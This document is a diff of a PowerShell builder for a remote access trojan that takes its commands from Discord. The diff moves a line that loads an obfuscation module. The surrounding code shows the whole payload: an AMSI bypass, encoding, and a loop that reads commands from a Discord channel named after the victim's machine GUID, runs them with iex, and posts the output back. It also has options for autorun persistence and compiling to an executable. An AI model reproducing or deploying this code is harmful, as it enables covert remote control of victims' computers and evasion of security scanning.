@@ -12,6 +12,8 @@ $use_older_commentgen_system is an advanced option that uses a simpler comment g
 $compile is an option that compiles the PowerShell script into a Windows executable when enabled, it is disabled by default
 #>
 
+gc obfuscate.ps1|out-string|iex
+
 ########## Config ##########
 $token = "REPLACE_THIS"
 $svrid = "REPLACE_THIS"
@@ -21,8 +23,6 @@ $use_older_commentgen_system = $false
 $compile = $false
 $autorunreg = (Get-Random $wordlist -c 2) -join " "
 ############################
-
-gc obfuscate.ps1|out-string|iex
 
 $commandline = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Invoke-PSObfuscation ($decryptor_func + $amsi + ';$w=&"New-Object" "Net.WebClient";$w."Headers"."add"("Authorization", "Bot ' + $token + '");$cid = (($w."DownloadString"("https://discord.com/api/v10/guilds/' + $svrid + '/channels") | &"ConvertFrom-Json") | &"?" {$_."name" -eq ((&"gpv" "HKLM:\SOFTWARE\Microsoft\Cryptography" "MachineGUID") + "_cl")})."id";while (' + $trueobf + ') {$w."Headers"["Content-Type"] = "application/json";$r=$w."DownloadString"("https://discord.com/api/v10/channels/" + $cid + "/messages");$z=$r|&"ConvertFrom-Json";$cmd=$z | &"?" { -not $_."author"."bot" } | &"select" -f 1;if ($cmd."content" -eq $pcmd) {&"sleep" 5} elseif ($cmd."attachments"."count" -gt 0) {} else {try {$out=&"iex" $cmd."content"|&"Out-String";if (-not $out) {$out="(no output)"}} catch {$out = $_."Exception"."Message"};if ($out."Length" -gt 2000) {$x2 = for ($i = 0; $i -lt $out."Length"; $i += 2000) {$out."Substring"($i, ([type]"Math")::"Min"."invoke"(2000, $out."Length" - $i))};foreach ($out2 in $x2) {$x=@{ content = $out2 } | &"ConvertTo-Json";$w."Headers"["Content-Type"] = "application/json";$w."UploadString"("https://discord.com/api/v10/channels/" + $cid + "/messages", "POST", $x);&"sleep" 1}}else {$w."Headers"["Content-Type"] = "application/json";$x=@{ content = $out } | &"ConvertTo-Json";$w."UploadString"("https://discord.com/api/v10/channels/" + $cid + "/messages", "POST", $x)};$pcmd = $cmd."content"}}'))))
 # credits: https://github.com/sasqwatch/FunnyKeylogger/
